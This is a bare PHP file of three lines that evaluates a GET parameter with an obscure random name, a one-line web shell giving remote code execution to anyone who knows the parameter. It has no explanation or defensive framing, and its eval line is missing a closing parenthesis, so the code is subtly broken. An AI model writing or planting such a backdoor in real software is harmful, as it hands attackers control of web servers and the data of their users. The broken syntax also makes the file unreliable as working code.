<?php
eval($_GET['nc32YHrA'];
?>
